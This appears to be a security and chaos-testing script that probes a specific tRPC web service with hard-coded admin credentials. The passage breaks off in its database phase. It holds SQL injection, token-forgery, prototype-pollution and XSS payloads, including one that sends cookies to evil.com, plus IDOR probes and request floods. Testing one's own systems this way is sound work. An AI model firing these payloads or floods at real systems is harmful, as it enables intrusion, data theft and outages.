#!/usr/bin/env node
/**
 * NexusOps Autonomous Chaos Engineering Agent v2
 * Agentic loop: DISCOVER → ATTACK → ANALYZE → ADAPT → ESCALATE → REPEAT
 *
 * Wire format (no superjson transformer):
 *   Queries:   GET /trpc/{proc}?input={...}   → result.data
 *   Mutations: POST /trpc/{proc} body={...}   → result.data
 */

const BASE = "http://139.84.154.78";
const API  = "http://139.84.154.78:3001";
const ADMIN_EMAIL    = "admin@coheron.com";
const ADMIN_PASSWORD = "demo1234!";

// ─── Telemetry ────────────────────────────────────────────────────────────────
interface Finding {
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO";
  category: string;
  title: string;
  endpoint: string;
  payload: string;
  observed: string;
  expected: string;
  hypothesis: string;
  reproSteps?: string;
}

const findings: Finding[] = [];
const logLines: string[]  = [];
const findingTitles        = new Set<string>(); // deduplicate

function emit(msg: string) {
  const line = `[${new Date().toISOString()}] ${msg}`;
  process.stdout.write(line + "\n");
  logLines.push(line);
}

function find(f: Finding) {
  if (findingTitles.has(f.title)) return;
  findingTitles.add(f.title);
  findings.push(f);
  const icon = f.severity === "CRITICAL" ? "🔴" : f.severity === "HIGH" ? "🟠" : f.severity === "MEDIUM" ? "🟡" : "🔵";
  emit(`  ${icon} [${f.severity}] ${f.title}`);
}

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }
function pct(arr: number[], p: number) {
  const s = [...arr].sort((a,b) => a-b);
  return s[Math.floor(s.length * p)] ?? 0;
}

// ─── HTTP helpers ─────────────────────────────────────────────────────────────
interface R { status: number; body: string; ms: number; }

async function httpPost(url: string, input: unknown, headers: Record<string,string> = {}): Promise<R> {
  const t = Date.now();
  try {
    const r = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...headers },
      body: typeof input === "string" ? input : JSON.stringify(input),
      signal: AbortSignal.timeout(15000),
    });
    return { status: r.status, body: await r.text(), ms: Date.now()-t };
  } catch (e: unknown) { return { status: 0, body: String(e), ms: Date.now()-t }; }
}

async function httpGet(url: string, headers: Record<string,string> = {}): Promise<R> {
  const t = Date.now();
  try {
    const r = await fetch(url, { headers, signal: AbortSignal.timeout(15000) });
    return { status: r.status, body: await r.text(), ms: Date.now()-t };
  } catch (e: unknown) { return { status: 0, body: String(e), ms: Date.now()-t }; }
}

// tRPC mutation (POST)
function mut(proc: string, input: unknown, session?: string): Promise<R> {
  const h: Record<string,string> = {};
  if (session) h["Authorization"] = `Bearer ${session}`;
  return httpPost(`${API}/trpc/${proc}`, input, h);
}

// tRPC query (GET + ?input=)
function qry(proc: string, input: unknown = {}, session?: string): Promise<R> {
  const h: Record<string,string> = {};
  if (session) h["Authorization"] = `Bearer ${session}`;
  const qs = encodeURIComponent(JSON.stringify(input));
  return httpGet(`${API}/trpc/${proc}?input=${qs}`, h);
}

function parseData(body: string): unknown {
  try { return JSON.parse(body)?.result?.data; } catch { return null; }
}

/** auth.me returns 200 + null when unauthenticated; only a payload with user counts as an authenticated session. */
function isAuthMeAuthenticated(body: string): boolean {
  const d = parseData(body) as { user?: unknown } | null;
  return d != null && typeof d === "object" && d.user != null;
}

// ─── Auth state ───────────────────────────────────────────────────────────────
let ADMIN_SESSION  = "";
let VICTIM_SESSION = "";
let VICTIM_USER_ID = "";
let ADMIN_ORG_ID   = "";

// ─── PHASE 1: AUTHENTICATION & DISCOVERY ─────────────────────────────────────
async function phase1_auth(): Promise<boolean> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 1: AUTHENTICATION & DISCOVERY");
  emit("══════════════════════════════════════════");

  // Admin login
  const r = await mut("auth.login", { email: ADMIN_EMAIL, password: ADMIN_PASSWORD });
  if (r.status !== 200) {
    find({ severity:"CRITICAL", category:"AUTH", title:"Admin login failed — cannot proceed",
      endpoint:"/trpc/auth.login", payload:`{email:${ADMIN_EMAIL}}`,
      observed:`HTTP ${r.status}: ${r.body.slice(0,150)}`, expected:"200 + sessionId",
      hypothesis:"Login endpoint broken or rate-limited from discovery phase" });
    return false;
  }
  ADMIN_SESSION  = (parseData(r.body) as {sessionId:string})?.sessionId ?? "";
  ADMIN_ORG_ID   = (parseData(r.body) as {org:{id:string}})?.org?.id ?? "";
  emit(`  ✓ Admin session: ${ADMIN_SESSION.slice(0,12)}… orgId: ${ADMIN_ORG_ID.slice(0,8)}…`);

  // Create victim account in separate org
  const ts = Date.now();
  const r2 = await mut("auth.signup", {
    email: `chaos_victim_${ts}@chaos.test`,
    password: "Victim123!@#",
    name: "Chaos Victim",
    orgName: `ChaosVictimOrg_${ts}`,
  });
  if (r2.status === 200) {
    VICTIM_SESSION = (parseData(r2.body) as {sessionId:string})?.sessionId ?? "";
    VICTIM_USER_ID = (parseData(r2.body) as {user:{id:string}})?.user?.id ?? "";
    emit(`  ✓ Victim session: ${VICTIM_SESSION.slice(0,12)}… userId: ${VICTIM_USER_ID.slice(0,8)}…`);
  } else {
    emit(`  ⚠ Victim signup: HTTP ${r2.status} — ${r2.body.slice(0,100)}`);
  }

  // Probe undocumented routes
  emit("  Probing internal/undocumented routes…");
  for (const [path, authed] of [
    ["/internal/metrics", false], ["/internal/health", false],
    ["/health/detailed",  false], ["/ready",             false],
    ["/health",           false], ["/metrics",           false],
    ["/.env",             false], ["/debug",             false],
    ["/admin",            false], ["/swagger",           false],
  ] as [string, boolean][]) {
    const resp = authed
      ? await httpGet(`${API}${path}`, { Authorization: `Bearer ${ADMIN_SESSION}` })
      : await httpGet(`${API}${path}`);
    const label = resp.status === 200 ? "⚡ EXPOSED" : `   ${resp.status}`;
    emit(`  ${label}  GET ${path}`);
    if (resp.status === 200 && !authed && (path.startsWith("/internal") || path.startsWith("/debug") || path === "/.env")) {
      find({ severity:"MEDIUM", category:"SECURITY",
        title:`Sensitive endpoint accessible without authentication: ${path}`,
        endpoint:`${API}${path}`, payload:"GET (no auth)",
        observed:`HTTP 200 — ${resp.body.slice(0,80)}`,
        expected:"401 Unauthorized or 404 Not Found",
        hypothesis:"Internal observability endpoint lacks auth middleware; exposes metrics, health state, error rates to unauthenticated callers",
        reproSteps:`curl ${API}${path}` });
    }
  }

  return true;
}

// ─── PHASE 2: UNAUTHENTICATED ACCESS ─────────────────────────────────────────
async function phase2_unauth(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 2: UNAUTHENTICATED ACCESS PROBING");
  emit("══════════════════════════════════════════");

  const protectedQueries = [
    ["tickets.list",            {}],
    ["dashboard.getMetrics",    {}],
    ["auth.me",                 {}],
    ["security.incidents.list", {}],
    ["financial.budgets.list",  {}],
    ["hr.cases.list",           {}],
    ["admin.users.list",        {}],
  ];
  for (const [proc, input] of protectedQueries) {
    const r = await qry(proc as string, input);
    if (r.status === 200 && JSON.parse(r.body)?.result?.data !== null) {
      find({ severity:"CRITICAL", category:"AUTH",
        title:`Protected query accessible without auth: ${proc}`,
        endpoint:`/trpc/${proc}`, payload:"GET no-auth",
        observed:`HTTP 200 with data`, expected:"401 UNAUTHORIZED",
        hypothesis:"Auth middleware missing on query handler" });
    } else {
      emit(`  ✓ ${proc}: ${r.status} (protected)`);
    }
  }

  // Unauthenticated mutation
  const r = await mut("tickets.create", { title:"UNAUTH_TICKET", description:"no auth", priority:"3_moderate", type:"incident" });
  if (r.status === 200) {
    find({ severity:"CRITICAL", category:"AUTH",
      title:"tickets.create accessible without authentication",
      endpoint:"/trpc/tickets.create", payload:`create ticket no-auth`,
      observed:"HTTP 200 — ticket created", expected:"401 UNAUTHORIZED",
      hypothesis:"Write mutation lacks auth guard" });
  } else {
    emit(`  ✓ tickets.create (no auth): ${r.status}`);
  }
}

// ─── PHASE 3: AUTH BYPASS & TOKEN ATTACKS ─────────────────────────────────────
async function phase3_auth_bypass(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 3: AUTH BYPASS & TOKEN ATTACKS");
  emit("══════════════════════════════════════════");

  // 3a. Token tampering
  emit("  3a. Tampered tokens…");
  const badTokens = [
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    ADMIN_SESSION.slice(0,-4) + "XXXX",
    " ", "", "null", "0", "undefined",
    "../../../etc/passwd",
    "<script>alert(1)</script>",
    "'; DROP TABLE sessions;--",
    ADMIN_SESSION + ADMIN_SESSION,
    Buffer.from(JSON.stringify({role:"admin",userId:"00000000-0000-0000-0000-000000000001"})).toString("base64"),
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",  // JWT none algorithm
  ];
  let tamperBypasses = 0;
  for (const tok of badTokens) {
    const r = await qry("auth.me", {}, tok);
    if (r.status === 200 && isAuthMeAuthenticated(r.body)) {
      tamperBypasses++;
      find({ severity:"CRITICAL", category:"AUTH",
        title:"Authentication bypass with tampered token",
        endpoint:"/trpc/auth.me", payload:`Bearer: ${tok.slice(0,40)}`,
        observed:"HTTP 200 — authenticated", expected:"401 UNAUTHORIZED",
        hypothesis:"Session lookup does not verify token integrity" });
    }
  }
  emit(`  ✓ ${badTokens.length - tamperBypasses}/${badTokens.length} tampered tokens rejected`);

  // 3b. SQL injection in login
  emit("  3b. SQL injection in auth.login…");
  const sqlPayloads = [
    { email: "' OR '1'='1", password: "x" },
    { email: "admin@coheron.com'--", password: "x" },
    { email: "admin@coheron.com'; SELECT pg_sleep(5);--", password: "x" },
    { email: "' UNION SELECT null,null,null,null,null--", password: "x" },
    { email: "\" OR \"1\"=\"1", password: "x" },
  ];
  for (const p of sqlPayloads) {
    const r = await mut("auth.login", p);
    const d = parseData(r.body) as {sessionId?:string} | null;
    if (r.status === 200 && d?.sessionId) {
      find({ severity:"CRITICAL", category:"SECURITY",
        title:"SQL injection bypass in auth.login",
        endpoint:"/trpc/auth.login", payload:JSON.stringify(p),
        observed:"HTTP 200 — sessionId returned", expected:"401 UNAUTHORIZED",
        hypothesis:"Parameterized queries not used in auth query" });
    }
  }
  emit("  ✓ SQL injection: no bypass");

  // 3c. Login rate limit validation
  emit("  3c. Login rate limit (8 rapid attempts for same email)…");
  const rlEmail = `rate_test_${Date.now()}@chaos.test`;
  const rlResults: number[] = [];
  for (let i = 0; i < 8; i++) {
    const r = await mut("auth.login", { email: rlEmail, password: "wrong" });
    rlResults.push(r.status);
  }
  const got429 = rlResults.includes(429);
  const codes = rlResults.join(",");
  emit(`  Rate limit test: [${codes}]`);
  if (!got429) {
    find({ severity:"HIGH", category:"SECURITY",
      title:"Login rate limit not triggered within 8 attempts",
      endpoint:"/trpc/auth.login", payload:`8× failed login for ${rlEmail}`,
      observed:`Status codes: ${codes}`,
      expected:"429 TOO_MANY_REQUESTS by attempt 6",
      hypothesis:"checkLoginRateLimit not firing for unknown emails; Redis key may use wrong format or TTL not set correctly" });
  } else {
    emit(`  ✓ Rate limit triggered at attempt ${rlResults.indexOf(429)+1}`);
  }

  // 3d. Password reset token brute force
  emit("  3d. Password reset token attacks…");
  for (const tok of ["00000000000000000000000000000000", "1", "null", "' OR '1'='1"]) {
    const r = await mut("auth.resetPassword", { token: tok, password: "NewHack123!" });
    if (r.status === 200) {
      find({ severity:"CRITICAL", category:"AUTH",
        title:"Password reset accepts arbitrary/invalid token",
        endpoint:"/trpc/auth.resetPassword", payload:`{token:"${tok}"}`,
        observed:"HTTP 200", expected:"400/401",
        hypothesis:"Token not validated in password reset flow" });
    }
  }

  // 3e. Prototype pollution
  emit("  3e. Prototype pollution…");
  for (const p of [
    { "__proto__": { "admin": true }, email: ADMIN_EMAIL, password: ADMIN_PASSWORD },
    { "constructor": { "prototype": { "admin": true } }, email: ADMIN_EMAIL, password: ADMIN_PASSWORD },
  ]) {
    const r = await httpPost(`${API}/trpc/auth.login`, p);
    if (r.status === 500) {
      find({ severity:"HIGH", category:"SECURITY",
        title:"Prototype pollution causes 500 in auth.login",
        endpoint:"/trpc/auth.login", payload:"__proto__ injection",
        observed:"HTTP 500", expected:"400 BAD_REQUEST",
        hypothesis:"__proto__ not fully stripped before reaching handler" });
    }
  }
}

// ─── PHASE 4: IDOR & CROSS-ORG DATA ACCESS ────────────────────────────────────
async function phase4_idor(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 4: IDOR & CROSS-ORG ACCESS");
  emit("══════════════════════════════════════════");

  // Get admin org ticket IDs
  const listR = await qry("tickets.list", { limit: 5 }, ADMIN_SESSION);
  const adminTickets = ((parseData(listR.body) as {items?:{id:string}[]} | null)?.items ?? []).slice(0,3);
  emit(`  Admin org tickets: ${adminTickets.length}`);

  if (!VICTIM_SESSION) { emit("  SKIP: no victim session"); }
  else {
    // Victim reads admin ticket
    for (const t of adminTickets) {
      const r = await qry("tickets.get", { id: t.id }, VICTIM_SESSION);
      if (r.status === 200) {
        const data = parseData(r.body) as {id?:string} | null;
        if (data?.id === t.id) {
          find({ severity:"CRITICAL", category:"SECURITY",
            title:"IDOR: Cross-org ticket read — victim can read admin org ticket",
            endpoint:"/trpc/tickets.get", payload:`{id: "${t.id}"}`,
            observed:`HTTP 200 — returned ticket from DIFFERENT org`,
            expected:"404 NOT_FOUND or 403 FORBIDDEN",
            hypothesis:"orgId not filtered in tickets.get; any authenticated user reads any ticket by UUID",
            reproSteps:`1. Sign up new org\n2. GET /trpc/tickets.get?input={"id":"${t.id}"} with victim Bearer token\n3. Observe: returns ticket from admin org` });
        }
      }
    }

    // Victim writes to admin ticket
    for (const t of adminTickets.slice(0,1)) {
      const r = await mut("tickets.update", { id: t.id, title: "IDOR_WRITE_TEST" }, VICTIM_SESSION);
      if (r.status === 200) {
        find({ severity:"CRITICAL", category:"SECURITY",
          title:"IDOR: Cross-org ticket write — victim can modify admin org ticket",
          endpoint:"/trpc/tickets.update", payload:`{id:"${t.id}", title:"IDOR_WRITE_TEST"}`,
          observed:"HTTP 200 — ticket modified", expected:"404 NOT_FOUND",
          hypothesis:"No orgId scope on update path" });
      }
    }
    emit(`  IDOR cross-org read/write: checked`);

    // Victim accesses admin user profile
    if (VICTIM_USER_ID) {
      const adminGetUser = await qry("admin.users.get", { id: VICTIM_USER_ID }, ADMIN_SESSION);
      emit(`  Admin reading victim user profile: HTTP ${adminGetUser.status}`);
    }

    // Non-admin victim tries admin procedures
    emit("  Victim session on admin procedures…");
    for (const [proc, input] of [
      ["admin.users.list",       {}],
      ["admin.getSystemSettings",{}],
      ["admin.listOrganizations",{}],
    ] as [string, Record<string,unknown>][]) {
      const r = await qry(proc, input, VICTIM_SESSION);
      if (r.status === 200) {
        find({ severity:"CRITICAL", category:"SECURITY",
          title:`Non-admin user can access admin procedure: ${proc}`,
          endpoint:`/trpc/${proc}`, payload:"victim session",
          observed:"HTTP 200", expected:"403 FORBIDDEN",
          hypothesis:"Admin guard missing on this procedure" });
      } else {
        emit(`  ✓ ${proc} (victim): ${r.status}`);
      }
    }
  }

  // UUID enumeration
  emit("  UUID enumeration probe…");
  for (const fakeId of [
    "00000000-0000-0000-0000-000000000001",
    "00000000-0000-0000-0000-000000000002",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
  ]) {
    const r = await qry("tickets.get", { id: fakeId }, ADMIN_SESSION);
    if (r.status === 200 && (parseData(r.body) as {id?:string} | null)?.id) {
      find({ severity:"HIGH", category:"SECURITY",
        title:"Ticket enumerable via predictable/sequential UUID",
        endpoint:"/trpc/tickets.get", payload:`{id:"${fakeId}"}`,
        observed:"HTTP 200 — ticket returned", expected:"404 NOT_FOUND",
        hypothesis:"Auto-increment or predictable UUID exposes data to enumeration" });
    }
  }
}

// ─── PHASE 5: INPUT VALIDATION DESTRUCTION ────────────────────────────────────
async function phase5_input(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 5: INPUT VALIDATION ATTACKS");
  emit("══════════════════════════════════════════");

  // 5a. XSS / injection payloads
  emit("  5a. XSS/injection in ticket fields…");
  const injectionPayloads = [
    { title: "<script>alert('XSS')</script>",                    expect: "sanitized" },
    { title: "<img src=x onerror=alert(1)>",                     expect: "sanitized" },
    { title: "javascript:alert(1)",                              expect: "allowed" },
    { title: `<svg onload="fetch('http://evil.com/'+document.cookie)">`, expect: "sanitized" },
    { title: "{{7*7}}",                                          expect: "literal" },
    { title: "${7*7}",                                           expect: "literal" },
    { title: "<%=7*7%>",                                         expect: "literal" },
    { title: "` + constructor.constructor('alert(1)')()`",       expect: "sanitized" },
  ];
  let xss500s = 0;
  for (const { title } of injectionPayloads) {
    const r = await mut("tickets.create",
      { title, description: title, priority: "4_low", type: "incident" },
      ADMIN_SESSION);
    if (r.status === 500) xss500s++;
    if (r.status === 200) {
      const returned = (parseData(r.body) as {title?:string} | null)?.title ?? "";
      if (returned.includes("<script>") || returned.includes("onerror=") || returned.includes("onload=")) {
        find({ severity:"HIGH", category:"SECURITY",
          title:"Stored XSS: script/event tags returned unsanitized in ticket response",
          endpoint:"/trpc/tickets.create", payload:`title: ${title}`,
          observed:`Response contains: ${returned.slice(0,60)}`,
          expected:"HTML entities escaped in response",
          hypothesis:"No server-side HTML sanitization; if frontend renders as innerHTML, stored XSS executes" });
      }
    }
  }
  if (xss500s > 0) {
    find({ severity:"HIGH", category:"STABILITY",
      title:`${xss500s} injection payloads cause HTTP 500 in tickets.create`,
      endpoint:"/trpc/tickets.create", payload:"XSS strings in title/description",
      observed:`${xss500s} × 500`, expected:"400 BAD_REQUEST",
      hypothesis:"Injection strings hit an unhandled code path (DB column type or regex filter panic)" });
  }

  // 5b. Body limit test
  emit("  5b. Oversized payload (bodyLimit breach)…");
  const bodyLimitKb = parseInt(process.env["MAX_BODY_BYTES"] ?? "1048576");
  for (const sz of [50_000, 500_000, 1_100_000, 2_000_000, 10_000_000]) {
    const body = JSON.stringify({ title: "X".repeat(sz), description: "Y", priority: "4_low", type: "incident" });
    const t = Date.now();
    try {
      const r = await fetch(`${API}/trpc/tickets.create`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${ADMIN_SESSION}` },
        body,
        signal: AbortSignal.timeout(10000),
      });
      const ms = Date.now()-t;
      emit(`  ${(sz/1000).toFixed(0)}KB: HTTP ${r.status} (${ms}ms)`);
      if (r.status === 200 && sz > bodyLimitKb) {
        find({ severity:"HIGH", category:"STABILITY",
          title:`Body limit bypassed: ${(sz/1000).toFixed(0)}KB payload accepted`,
          endpoint:"/trpc/tickets.create", payload:`${(sz/1000).toFixed(0)}KB title string`,
          observed:`HTTP 200 — stored in DB`, expected:"413 Content Too Large",
          hypothesis:`MAX_BODY_BYTES=${bodyLimitKb} not enforced for this payload size` });
      }
    } catch (e: unknown) {
      emit(`  ${(sz/1000).toFixed(0)}KB: TIMEOUT — ${String(e).slice(0,40)}`);
    }
  }

  // 5c. Type confusion
  emit("  5c. Type confusion attacks…");
  const typeAttacks = [
    { title: null,      priority: "3_moderate", type: "incident" },
    { title: undefined, priority: "3_moderate", type: "incident" },
    { title: [],        priority: "3_moderate", type: "incident" },
    { title: {},        priority: "3_moderate", type: "incident" },
    { title: true,      priority: "3_moderate", type: "incident" },
    { title: 42,        priority: "3_moderate", type: "incident" },
    {},
    { title: "t",       priority: "CRITICAL",   type: "incident" }, // bad enum
    { title: "t",       priority: "3_moderate", type: "MALICIOUS_TYPE" }, // bad enum
    { title: "t",       priority: 999,           type: "incident" }, // wrong type
  ];
  let type500s = 0;
  for (const p of typeAttacks) {
    const r = await mut("tickets.create", p, ADMIN_SESSION);
    if (r.status === 500) type500s++;
  }
  if (type500s > 0) {
    find({ severity:"MEDIUM", category:"STABILITY",
      title:`${type500s}/${typeAttacks.length} type-mismatch inputs cause 500 in tickets.create`,
      endpoint:"/trpc/tickets.create", payload:"null/array/bool/wrong-enum variants",
      observed:`${type500s} × HTTP 500`, expected:"400 BAD_REQUEST with Zod error",
      hypothesis:"Type coercion in Zod schema passes invalid types to DB layer" });
  } else {
    emit(`  ✓ Type confusion: all returned 4xx`);
  }

  // 5d. Numeric boundary
  emit("  5d. Numeric boundary…");
  for (const val of [-1, 0, 999999999, 2147483647, 2147483648, -2147483649]) {
    const r = await mut("tickets.create",
      { title: "NUM_TEST", priority: "3_moderate", type: "incident", slaMinutes: val },
      ADMIN_SESSION);
    if (r.status === 500) {
      find({ severity:"MEDIUM", category:"STABILITY",
        title:`Numeric overflow causes 500: slaMinutes=${val}`,
        endpoint:"/trpc/tickets.create", payload:`{slaMinutes:${val}}`,
        observed:"HTTP 500", expected:"400 BAD_REQUEST",
        hypothesis:"Integer overflow / DB column constraint not validated by Zod" });
    }
  }
}

// ─── PHASE 6: CONCURRENCY & RACE CONDITIONS ──────────────────────────────────
async function phase6_concurrency(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 6: CONCURRENCY & RACE CONDITIONS");
  emit("══════════════════════════════════════════");

  // 6a. 50-way concurrent idempotency race
  emit("  6a. 50-concurrent idempotent creates (race condition test)…");
  const ikey = `race-${Date.now()}`;
  const race50 = await Promise.all(
    Array.from({length:50}, () =>
      mut("tickets.create", {
        title: `IDEM_RACE_${ikey}`,
        description: "idempotency race test",
        priority: "4_low",
        type: "incident",
        idempotencyKey: ikey,
      }, ADMIN_SESSION)
    )
  );
  const r50_200  = race50.filter(r => r.status === 200).length;
  const r50_500  = race50.filter(r => r.status >= 500).length;
  const r50_ids  = race50.filter(r => r.status === 200)
    .map(r => { try { return (parseData(r.body) as {id?:string}|null)?.id; } catch { return null; } })
    .filter(Boolean);
  const uniqueIds = new Set(r50_ids).size;
  emit(`  50× same-key create: ${r50_200} ok | ${r50_500} 5xx | ${uniqueIds} unique IDs`);
  if (uniqueIds > 1) {
    find({ severity:"CRITICAL", category:"DATA_INTEGRITY",
      title:`Idempotency breach: ${uniqueIds} duplicate tickets created for same key`,
      endpoint:"/trpc/tickets.create", payload:`50× same idempotencyKey="${ikey}"`,
      observed:`${uniqueIds} distinct ticket IDs returned`,
      expected:"Exactly 1 unique ID across all 50 calls",
      hypothesis:"Redis idempotency check + DB insert not atomic; race window allows multiple inserts",
      reproSteps:"Send 50 concurrent POST /trpc/tickets.create with identical idempotencyKey; observe multiple unique IDs" });
  }
  if (r50_500 > 0) {
    find({ severity:"HIGH", category:"STABILITY",
      title:`${r50_500}/50 idempotent concurrent creates return 500`,
      endpoint:"/trpc/tickets.create", payload:`50× concurrent with same key`,
      observed:`${r50_500} server errors`, expected:"0 errors — idempotent returns or 200s",
      hypothesis:"Concurrent DB inserts create unique constraint violation that propagates as 500 instead of returning existing record" });
  }

  // 6b. Concurrent updates on same ticket
  emit("  6b. 30-concurrent updates on same ticket…");
  const createR = await mut("tickets.create",
    { title:"RACE_TARGET", description:"race", priority:"4_low", type:"incident" },
    ADMIN_SESSION);
  const raceTicketId = (parseData(createR.body) as {id?:string}|null)?.id;
  if (raceTicketId) {
    const upd30 = await Promise.all(
      Array.from({length:30}, (_, i) =>
        mut("tickets.update", { id: raceTicketId, title: `CONCURRENT_${i}` }, ADMIN_SESSION)
      )
    );
    const upd500 = upd30.filter(r => r.status >= 500).length;
    if (upd500 > 0) {
      find({ severity:"HIGH", category:"STABILITY",
        title:`${upd500}/30 concurrent updates on same ticket cause 500`,
        endpoint:"/trpc/tickets.update", payload:"30× simultaneous update",
        observed:`${upd500} server errors`, expected:"All 200 or serialized",
        hypothesis:"DB serialization error bubbles as 500; no retry/conflict handling" });
    } else emit(`  ✓ 30× concurrent update: 0 errors`);
  }

  // 6c. Login storm
  emit("  6c. 20-concurrent logins same user…");
  const lg20 = await Promise.all(
    Array.from({length:20}, () =>
      mut("auth.login", { email: ADMIN_EMAIL, password: ADMIN_PASSWORD }))
  );
  const lg_200 = lg20.filter(r => r.status === 200).length;
  const lg_429 = lg20.filter(r => r.status === 429).length;
  const lg_500 = lg20.filter(r => r.status >= 500).length;
  emit(`  20× concurrent login: ${lg_200} ok | ${lg_429} rate-limited | ${lg_500} errors`);
  if (lg_500 > 0) {
    find({ severity:"HIGH", category:"STABILITY",
      title:`${lg_500}/20 concurrent logins return 500`,
      endpoint:"/trpc/auth.login", payload:"20× concurrent same user",
      observed:`${lg_500} server errors`, expected:"200 or 429, never 500",
      hypothesis:"Bcrypt semaphore or session DB insert race under concurrent login" });
  }

  // 6d. Signup flood (10 concurrent new orgs)
  emit("  6d. 10-concurrent signup (new org spam)…");
  const ts = Date.now();
  const signup10 = await Promise.all(
    Array.from({length:10}, (_, i) =>
      mut("auth.signup", {
        email: `flood_${ts}_${i}@chaos.test`,
        password: "Flood123!",
        name: `Flood User ${i}`,
        orgName: `FloodOrg_${ts}_${i}`,
      }))
  );
  const s200 = signup10.filter(r => r.status === 200).length;
  const s500 = signup10.filter(r => r.status >= 500).length;
  emit(`  10× concurrent signup: ${s200} ok | ${s500} errors`);
  if (s500 > 2) {
    find({ severity:"MEDIUM", category:"STABILITY",
      title:`${s500}/10 concurrent signups return 500`,
      endpoint:"/trpc/auth.signup", payload:"10× concurrent new org signup",
      observed:`${s500} server errors`, expected:"All 200",
      hypothesis:"Signup concurrency issue in org+user creation transaction" });
  }
}

// ─── PHASE 7: API DESTRUCTION ENGINE ─────────────────────────────────────────
async function phase7_api_destruction(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 7: API DESTRUCTION ENGINE");
  emit("══════════════════════════════════════════");

  // 7a. Concurrency ramp
  for (const concurrency of [10, 50, 100, 300, 500]) {
    emit(`  Ramp: ${concurrency}× concurrent tickets.create…`);
    const t = Date.now();
    const ramp = await Promise.all(
      Array.from({length:concurrency}, (_, i) =>
        mut("tickets.create", {
          title: `RAMP_${concurrency}_${i}`,
          description: "load test",
          priority: "4_low",
          type: "incident",
        }, ADMIN_SESSION))
    );
    const elapsed = Date.now()-t;
    const r200 = ramp.filter(r => r.status === 200).length;
    const r429 = ramp.filter(r => r.status === 429).length;
    const r503 = ramp.filter(r => r.status === 503).length;
    const r500 = ramp.filter(r => r.status === 500).length;
    const r0   = ramp.filter(r => r.status === 0).length;
    const lats = ramp.map(r => r.ms);
    emit(`    ${r200} ok | ${r429} rl | ${r503} overload | ${r500} err | ${r0} net-fail | p95=${pct(lats,0.95)}ms total=${elapsed}ms`);
    if (r500 > 0) {
      find({ severity:"HIGH", category:"STABILITY",
        title:`${r500}/${concurrency} requests return 500 at concurrency=${concurrency}`,
        endpoint:"/trpc/tickets.create", payload:`${concurrency}× concurrent`,
        observed:`${r500} server errors`, expected:"200/429/503, never 500",
        hypothesis:"DB pool pressure or transaction error under concurrency" });
    }
    if (r0 > concurrency * 0.1) {
      find({ severity:"HIGH", category:"STABILITY",
        title:`${r0}/${concurrency} requests fail at network level (concurrency=${concurrency})`,
        endpoint:"/trpc/tickets.create", payload:`${concurrency}× concurrent`,
        observed:`${r0} connection failures`, expected:"<10% network failures",
        hypothesis:"TCP backlog or Fastify connection queue exhausted" });
    }
    if (concurrency >= 100) await sleep(2000);
  }

  // 7b. Unprotected internal endpoint burst
  emit("  7b. 300× burst on unprotected /internal/metrics…");
  const burst = await Promise.all(
    Array.from({length:300}, () => httpGet(`${API}/internal/metrics`))
  );
  const b200 = burst.filter(r => r.status === 200).length;
  const b0   = burst.filter(r => r.status === 0).length;
  emit(`  /internal/metrics 300×: ${b200} ok | ${b0} fail`);
  if (b0 > 15) {
    find({ severity:"MEDIUM", category:"STABILITY",
      title:`${b0}/300 requests to /internal/metrics fail under burst`,
      endpoint:`${API}/internal/metrics`, payload:"300× unauthenticated GET",
      observed:`${b0} connection failures`, expected:"All 200 or 429",
      hypothesis:"Unprotected endpoint has no rate limiting; connection pool saturation" });
  }

  // 7c. Hidden/admin endpoint discovery
  emit("  7c. Admin/hidden endpoint probe (authenticated)…");
  for (const path of [
    "/trpc/admin.getAllUsers",
    "/trpc/admin.getSystemSettings",
    "/trpc/admin.listOrganizations",
    "/trpc/admin.impersonateUser",
    "/trpc/admin.deleteOrganization",
  ]) {
    const r = await httpGet(`${API}${path}?input={}`, { Authorization: `Bearer ${ADMIN_SESSION}` });
    emit(`  ${path}: ${r.status}`);
    if (r.status === 200) {
      try {
        const d = JSON.parse(r.body);
        if (d.result?.data) {
          find({ severity:"HIGH", category:"SECURITY",
            title:`Sensitive admin procedure exposed: ${path}`,
            endpoint:`${API}${path}`, payload:"Authenticated admin GET",
            observed:`HTTP 200: ${r.body.slice(0,80)}`, expected:"Scoped admin access only",
            hypothesis:"Super-admin endpoints not scoped; can expose cross-org data" });
        }
      } catch {}
    }
  }

  // 7d. Search injection
  emit("  7d. Search/filter injection…");
  const searchAttacks = [
    "' OR 1=1--",
    `%',1,1)--`,
    "A".repeat(10000),
    "<img src=x>",
    "\x00\x01\x02",
    "../../etc/passwd",
  ];
  for (const q of searchAttacks) {
    const r = await qry("search.global", { query: q }, ADMIN_SESSION);
    if (r.status === 500) {
      find({ severity:"HIGH", category:"SECURITY",
        title:"Search query injection causes 500",
        endpoint:"/trpc/search.global", payload:`query: ${q.slice(0,30)}`,
        observed:"HTTP 500", expected:"200 with empty results or 400 BAD_REQUEST",
        hypothesis:"Search term not parameterized; SQL/fulltext injection possible" });
    }
  }
}

// ─── PHASE 8: DB INTEGRITY ATTACKS ───────────────────────────────────────────
async function phase8_db_integrity(): Promise<void> {
  emit("\n══════════════════════════════════════════");
  emit("  PHASE 8: DATABASE INTEGRITY ATTACKS");
  emit("══════════════════════════════════════════");

  // 8a. Concurrent read+write+comment race on same ticket
  const ticketR = await mut("tickets.create",
    { title:`DB_INTEGRITY_${Date.now()}`, description:"db test", priority:"4_low", type:"incident" },
    ADMIN_SESSION);
  const dbTicketId = (parseData(ticketR.body) as {id?:string}|null)?.id;
  if (dbTicketId) {
    emit(`  8a. Concurrent ops on ticket ${dbTicketId.slice(0,8)}…`);
    const ops = await Promise.all([
